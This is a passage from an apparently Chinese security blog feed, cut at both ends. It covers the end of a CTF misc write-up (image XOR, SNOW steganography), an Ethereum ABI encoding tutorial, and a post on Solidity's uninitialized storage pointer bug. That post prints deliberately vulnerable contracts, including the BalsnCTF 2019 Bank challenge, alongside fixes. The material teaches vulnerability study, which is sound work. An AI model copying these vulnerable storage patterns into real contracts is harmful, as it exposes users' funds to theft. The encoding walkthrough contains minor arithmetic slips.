class="hljs-string">&#x27;1.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../images/1-17004809240705.png" alt="1"></p><p>然后与该图片进行异或操作</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> cv2<br><br><span class="hljs-comment"># 读取两张图片</span><br>image1 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;attach.png&quot;</span>)<br>image2 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.png&quot;</span>)<br><br><span class="hljs-comment"># 调整图片尺寸使其保持一致</span><br>image1 = image1.resize(image2.size)<br><br><span class="hljs-comment"># 转换为 numpy 数组</span><br>array1 = np.array(image1)<br>array2 = np.array(image2)<br><br><span class="hljs-comment"># 对两个数组执行异或操作</span><br>xor_result = np.bitwise_xor(array1, array2)<br><br><span class="hljs-comment"># 将结果转换为图像并保存</span><br>result_image = Image.fromarray(xor_result)<br>result_image.save(<span class="hljs-string">&quot;3.png&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../images/3-17004809615457.png" alt="3"></p><p>扫码得到flag</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-20%20194939.png" alt="屏幕截图 2023-11-20 194939"></p><h3 id="帕鲁杯"><a href="#帕鲁杯" class="headerlink" title="帕鲁杯"></a>帕鲁杯</h3><h4 id="ez-misc"><a href="#ez-misc" class="headerlink" title="ez_misc"></a>ez_misc</h4><p>给了一个加密的rar文件以及一张图片。在图片最后有this is password的空白隐写</p><p>snow解密得</p><p>.\SNOW.EXE -C .\White.txt<br>Carefree and carefree</p><p>修复rar文件，然后解密得到flag</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Function Selector and Argument Encoding</title>
      <link href="/2023/11/09/Function-Selector-and-Argument-Encoding/"/>
      <url>/2023/11/09/Function-Selector-and-Argument-Encoding/</url>
      
        <content type="html"><![CDATA[<p>在 Ethereum 生态系统中，ABI (Application Binary Interface，应用二进制接口) 是从区块链外部与合约进行交互以及合约与合约间进行交互的一种标准方式。数据会根据其类型按照这份手册中说明的方法进行编码。</p><h3 id="Function-Selector"><a href="#Function-Selector" class="headerlink" title="Function Selector"></a>Function Selector</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>某个函数签名的 Keccak (SHA-3) 哈希的前 4 字节，指定了要调用的函数，形如 bytes4(keccak256(‘balanceOf(address)’)) &#x3D;&#x3D; 0x70a08231 这种形式，0x70a08231 便是 balanceOf(address) 的 Function Selector</p><ul><li>基础原型即是函数名称加上由括号括起来的参数类型列表，参数类型间由一个逗号分隔开，且没有空格</li><li>对于 uint 类型，要转成 uint256 进行计算，比如 ownerOf(uint256) 其 Function Selector &#x3D; bytes4(keccak256(‘ownerOf(uint256)’)) &#x3D;&#x3D; 0x6352211e</li><li>函数参数包含结构体，相当于把结构体拆分成单个参数，只不过这些参数用 <code>()</code> 扩起来</li></ul><h3 id="Argument-Encoding"><a href="#Argument-Encoding" class="headerlink" title="Argument Encoding"></a>Argument Encoding</h3><p>从第5字节开始是被编码的参数。这种编码方式也被用在其他地方，比如，返回值和事件的参数也会被用同样的方式进行编码，而用来指定函数的4个字节则不需要再进行编码。</p><h2 id="类型编码"><a href="#类型编码" class="headerlink" title="类型编码"></a>类型编码</h2><p>以下是基础类型：</p><ul><li><code>uint&lt;M&gt;</code>： <code>M</code> 位的无符号整数， <code>0 &lt; M &lt;= 256</code>、 <code>M % 8 == 0</code>。例如： <code>uint32</code>， <code>uint8</code>， <code>uint256</code>。</li><li><code>int&lt;M&gt;</code>：以 2 的补码作为符号的 <code>M</code> 位整数， <code>0 &lt; M &lt;= 256</code>、 <code>M % 8 == 0</code>。</li><li><code>address</code>：除了字面上的意思和语言类型的区别以外，等价于 <code>uint160</code>。在计算和 函数选择器Function Selector 中，通常使用 <code>address</code>。</li><li><code>uint</code>、 <code>int</code>： <code>uint256</code>、 <code>int256</code> 各自的同义词。在计算和 函数选择器Function Selector 中，通常使用 <code>uint256</code> 和 <code>int256</code>。</li><li><code>bool</code>：等价于 <code>uint8</code>，取值限定为 0 或 1 。在计算和 函数选择器Function Selector 中，通常使用 <code>bool</code>。</li><li><code>fixed&lt;M&gt;x&lt;N&gt;</code>： <code>M</code> 位的有符号的固定小数位的十进制数字 <code>8 &lt;= M &lt;= 256</code>、 <code>M % 8 == 0</code>、且 <code>0 &lt; N &lt;= 80</code>。其值 <code>v</code> 即是 <code>v / (10 ** N)</code>。（也就是说，这种类型是由 M 位的二进制数据所保存的，有 N 位小数的十进制数值。译者注。）</li><li><code>ufixed&lt;M&gt;x&lt;N&gt;</code>：无符号的 <code>fixed&lt;M&gt;x&lt;N&gt;</code>。</li><li><code>fixed</code>、 <code>ufixed</code>： <code>fixed128x18</code>、 <code>ufixed128x18</code> 各自的同义词。在计算和 函数选择器Function Selector 中，通常使用 <code>fixed128x18</code> 和 <code>ufixed128x18</code>。</li><li><code>bytes&lt;M&gt;</code>： <code>M</code> 字节的二进制类型， <code>0 &lt; M &lt;= 32</code>。</li><li><code>function</code>：一个地址（20 字节）之后紧跟一个 函数选择器Function Selector （4 字节）。编码之后等价于 <code>bytes24</code>。</li></ul><p>以下是定长数组类型：</p><ul><li><p><code>&lt;type&gt;[M]</code>：有 <code>M</code> 个元素的定长数组， <code>M &gt;= 0</code>，数组元素为给定类型。</p><p>注解</p><p>尽管此ABI规范可以表示零个元素的定长数组，但编译器不支持它们。</p></li></ul><p>以下是非定长类型：</p><ul><li><code>bytes</code>：动态大小的字节序列。</li><li><code>string</code>：动态大小的 unicode 字符串，通常呈现为 UTF-8 编码。</li><li><code>&lt;type&gt;[]</code>：元素为给定类型的变长数组。</li></ul><p>可以将若干类型放到一对括号中，用逗号分隔开，以此来构成一个 元组tuple：</p><ul><li><code>(T1,T2,...,Tn)</code>：由 <code>T1</code>，…， <code>Tn</code>， <code>n &gt;= 0</code> 构成的 元组tuple。</li></ul><p>用 元组tuple 构成 元组tuple、用 元组tuple 构成数组等等也是可能的。另外也可以构成“零元组（zero-tuples）”，就是 <code>n = 0</code> 的情况。</p><h4 id="Solidity-到-ABI-类型-映射"><a href="#Solidity-到-ABI-类型-映射" class="headerlink" title="Solidity 到 ABI 类型 映射"></a>Solidity 到 ABI 类型 映射</h4><p>Solidity 支持上面介绍的所有同名称的类型，除元组外。 另一方面，一些 Solidity 类型不被 ABI 支持。下表在左栏显示了不支持 ABI 的 Solidity 类型，以及在右栏显示可以代表它们的 ABI 类型。</p><table><thead><tr><th>Solidity</th><th>ABI</th></tr></thead><tbody><tr><td><a href="https://learnblockchain.cn/docs/solidity/types.html#address">address payable</a></td><td><code>address</code></td></tr><tr><td><a href="https://learnblockchain.cn/docs/solidity/contracts.html#contracts">contract</a></td><td><code>address</code></td></tr><tr><td><a href="https://learnblockchain.cn/docs/solidity/types.html#enums">enum</a></td><td><code>uint8</code></td></tr><tr><td><a href="https://learnblockchain.cn/docs/solidity/types.html#user-defined-value-types">user defined value types</a></td><td>its underlying value type</td></tr><tr><td><a href="https://learnblockchain.cn/docs/solidity/types.html#structs">struct</a></td><td><code>tuple</code></td></tr></tbody></table><h3 id="Function-Selector-and-Argument-Encoding"><a href="#Function-Selector-and-Argument-Encoding" class="headerlink" title="Function Selector and Argument Encoding"></a>Function Selector and Argument Encoding</h3><ul><li>动态类型的数据，比如动态数组，结构体，变长字节，其编码后存储其 <code>offset</code>、<code>length</code>、<code>data</code><ul><li>先把参数顺序存储：如果是定长数据类型，直接存储其 <code>data</code>，如果是变长数据类型，先存储其 <code>offset</code></li><li>顺序遍历变长数据：先存储 <code>offset</code>，对于第一个变长数据，先存储其 <code>offset = 0x20 * number</code> ( <code>number</code> 是函数参数的个数 )；对于下一个变长数据，其 <code>offset = offset_of_prev + 0x20 + 0x20 * number</code> (第一个 <code>0x20</code> 是存储前一个变长数据的长度占用的大小，<code>number</code> 是前一个变长数据的元素个数)</li><li>顺序遍历变长数据：存储完 <code>offset</code> ，接着就是遍历每个变长数据，分别存储其 <code>length</code> 和 <code>data</code></li><li>( <code>ps:</code> 对于结构体这样的类型，存储的时候可把结构体内元素看成是一个新函数的参数，这样的话，对于结构体中的第一个变长数据，其 <code>offset = 0x20 * num</code> ，<code>num</code> 是结构体元素的个数 )</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">test7([[1, 2], [3]], [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;])<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs solidity">同理进行由内向外的拆分，首先是[[1, 2], [3]]动态数组中的[1, 2]和[3]两个动态数组<br>0 - a                                                                  // offset of [1, 2]<br>1 - b                                                                  // offset of [3]<br>2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1, 2]<br>3 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1<br>4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2<br>5 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]<br>6 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3<br>a指向[1, 2]的开始，所以a=0x20*2=0x40<br>b指向[3]的开始，所以b=0x20*5=0xa0<br><br>然后是[[1, 2], [3]]动态数组本身的encoding<br>0 - c                                                                  // offset of [[1, 2], [3]]<br>1 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1, 2], [3]]<br>2 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1, 2]<br>3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3]<br>4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1, 2]<br>5 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1<br>6 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2<br>7 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]<br>8 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3<br>c指向[[1, 2], [3]]的开始，所以a=0x20*2=0x40<br><br>其次是[&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]动态数组中每个string的encoding<br>0 - d                                                                  // offset for &quot;one&quot;<br>1 - e                                                                  // offset for &quot;two&quot;<br>2 - f                                                                  // offset for &quot;three&quot;<br>3 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;one&quot;<br>4 - 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of &quot;one&quot;<br>5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;two&quot;<br>6 - 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of &quot;two&quot;<br>7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // count for &quot;three&quot;<br>8 - 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of &quot;three&quot;<br>d指向“one”的开始，所以d=0x20*3=0x60<br>e指向“two”的开始，所以e=0x20*5=0xa0<br>f指向“three”的开始，所以f=0x20*7=0xe0<br><br>然后是[&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]动态数组本身的encoding<br>0 - g                                                                  // offset of [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]<br>1 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]<br>2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for &quot;one&quot;<br>3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for &quot;two&quot;<br>4 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for &quot;three&quot;<br>5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;one&quot;<br>6 - 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of &quot;one&quot;<br>7 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;two&quot;<br>8 - 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of &quot;two&quot;<br>9 - 0x0000000000000000000000000000000000000000000000000000000000000005 // count for &quot;three&quot;<br>10- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of &quot;three&quot;<br>这里g先不进行计算，因为涉及到函数参数整体的一个encoding<br><br>上面就已经把最后就是[[1, 2], [3]]和[&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]分析完毕，最后就是其作为一个整体进行encoding<br>0 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [[1, 2], [3]]<br>1 - g                                                                  // offset of [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]<br>2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1, 2], [3]]<br>3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1, 2]<br>4 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3]<br>5 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1, 2]<br>6 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1<br>7 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2<br>8 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]<br>9 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3<br>10- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]<br>11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for &quot;one&quot;<br>12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for &quot;two&quot;<br>13- 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for &quot;three&quot;<br>14- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;one&quot;<br>15- 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of &quot;one&quot;<br>16- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;two&quot;<br>17- 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of &quot;two&quot;<br>18- 0x0000000000000000000000000000000000000000000000000000000000000005 // count for &quot;three&quot;<br>19- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of &quot;three&quot;<br>g指向字符串数组的开始，所以g=0x20*10=140<br><br>所以总的selector+encoding如下所示<br>0xcc80bc65                                                             // function selector<br>0 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [[1, 2], [3]]<br>1 - 0x0000000000000000000000000000000000000000000000000000000000000140 // offset of [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]<br>2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1, 2], [3]]<br>3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1, 2]<br>4 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3]<br>5 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1, 2]<br>6 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1<br>7 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2<br>8 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]<br>9 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3<br>10- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]<br>11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for &quot;one&quot;<br>12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for &quot;two&quot;<br>13- 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for &quot;three&quot;<br>14- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;one&quot;<br>15- 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of &quot;one&quot;<br>16- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;two&quot;<br>17- 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of &quot;two&quot;<br>18- 0x0000000000000000000000000000000000000000000000000000000000000005 // count for &quot;three&quot;<br>19- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of &quot;three&quot;<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Uninitialized Storage Pointer</title>
      <link href="/2023/11/09/Uninitialized-Storage-Pointer/"/>
      <url>/2023/11/09/Uninitialized-Storage-Pointer/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>未初始化的存储指针是指在EVM中未进行初始化的storage变量，这个变量会指向其他变量的区域，从而改变其他变量的值。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br>contract example1&#123;<br>    uint public a;<br>    address public b;<br><br>    struct Wallet&#123;<br>        uint value;<br>        address addr;<br>    &#125;<br><br>    function setValue(uint _a,address _b) public &#123;<br>        a = _a;<br>        b = _b;<br>    &#125;<br><br>    function attack(uint _value, address _addr) public &#123;<br>        Wallet wallet;<br>        wallet.value = _value;<br>        wallet.addr = _addr;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在setValue设置（1  ,0x10aA1C20aD710B823f8c1508cfC12D5d1199117E）</p><p>这时发现a，b分别为 1  ,0x10aA1C20aD710B823f8c1508cfC12D5d1199117E</p><p>但是当 attack设置（3  ,0xa3b0D4BBF17F38e00F68Ce73f81D122FB1374ff6）</p><p>a和b也就变为了 3  ,0xa3b0D4BBF17F38e00F68Ce73f81D122FB1374ff6</p><p>这是因为在函数内部申明一个变量，通常默认是局部变量。但是Solidity的处理有些问题，在此处反直觉地默认让引用类型（Reference Type）变量，所以存储位置为storage。并且对于未初始化的storage 指针（类似传统语言中的空指针），Solidity 默认其指向 storage 的起始地址，即指向合约开头定义的状态变量。</p><p>也就是说，a指向slot0，b指向slot1.同时， wallet.value指向slot0，wallet.addr指向slot1。</p><p>同理，数组也有同样的问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.0;<br><br>contract C &#123;<br>    uint public someVariable;<br>    uint[] data;<br><br>    function f() public &#123;<br>        uint[] x;<br>        x.push(2);<br>        data = x;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>x与someVariable的指向相同。</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>实际上，这个问题只存在于solidity0.5.0之前的版本，编译器版本为0.4.26的话，报的还只是一个warning，不影响deploy；在下一个版本，0.5.0里面就变成了报error：</p><p>对于结构体，需要使用mapping对结构体进行初始化，并使用storage进行拷贝。</p><p>在 Solidity 中，一个未初始化的结构体并不会占用存储插槽。只有在对结构体进行实例化后，它才会占用实际的存储空间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br>contract example1&#123;<br>    uint public a;<br>    address public b;<br><br>    struct Wallet&#123;<br>        uint value;<br>        address addr;<br>    &#125;<br>    <br>    mapping (uint=&gt;Wallet)wallets;<br><br>    function setValue(uint _a,address _b) public &#123;<br>        a = _a;<br>        b = _b;<br>    &#125;<br><br>    function attack(uint _id,uint _value, address _addr) public &#123;<br>        Wallet storage wallet=wallets[_id];<br>        wallet.value = _value;<br>        wallet.addr = _addr;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>数组的修复，则是在生命变量的时候对其初始化操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.0;<br><br>contract C &#123;<br>    uint public someVariable;<br>    uint[] data;<br><br>    function f() public &#123;<br>        uint[] x=data;<br>        x.push(2);<br>        data = x;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="2019-BalsnCTF-Bank"><a href="#2019-BalsnCTF-Bank" class="headerlink" title="2019 BalsnCTF Bank"></a>2019 BalsnCTF Bank</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br>contract Bank &#123;<br>    event SendEther(address addr);<br>    event SendFlag(address addr);<br><br>    address public owner;<br>    uint randomNumber = 0;<br><br>    constructor() public &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    struct SafeBox &#123;<br>        bool done;<br>        function(uint, bytes12) internal callback;<br>        bytes12 hash;<br>        uint value;<br>    &#125;<br>    SafeBox[] safeboxes;<br><br>    struct FailedAttempt &#123;<br>        uint idx;<br>        uint time;<br>        bytes12 triedPass;<br>        address origin;<br>    &#125;<br>    mapping(address =&gt; FailedAttempt[]) failedLogs;<br><br>    modifier onlyPass(uint idx, bytes12 pass) &#123;<br>        if (bytes12(sha3(pass)) != safeboxes[idx].hash) &#123;<br>            FailedAttempt info;<br>            info.idx = idx;<br>            info.time = now;<br>            info.triedPass = pass;<br>            info.origin = tx.origin;<br>            failedLogs[msg.sender].push(info);<br>        &#125;<br>        else &#123;<br>            _;<br>        &#125;<br>    &#125;<br><br>    function deposit(bytes12 hash) payable public returns(uint) &#123;<br>        SafeBox box;<br>        box.done = false;<br>        box.hash = hash;<br>        box.value = msg.value;<br>        if (msg.sender == owner) &#123;<br>            box.callback = sendFlag;<br>        &#125;<br>        else &#123;<br>            require(msg.value &gt;= 1 ether);<br>            box.value -= 0.01 ether;<br>            box.callback = sendEther;<br>        &#125;<br>        safeboxes.push(box);<br>        return safeboxes.length-1;<br>    &#125;<br><br>    function withdraw(uint idx, bytes12 pass) public payable &#123;<br>        SafeBox box = safeboxes[idx];<br>        require(!box.done);<br>        box.callback(idx, pass);<br>        box.done = true;<br>    &#125;<br><br>    function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123;<br>        msg.sender.transfer(safeboxes[idx].value);<br>        emit SendEther(msg.sender);<br>    &#125;<br><br>    function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123;<br>        require(msg.value &gt;= 100000000 ether);<br>        emit SendFlag(msg.sender);<br>        selfdestruct(owner);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF 刷题</title>
      <link href="/2023/11/06/NSSCTF-%E5%88%B7%E9%A2%98/"/>
      <url>/2023/11/06/NSSCTF-%E5%88%B7%E9%A2%98/</url>
      
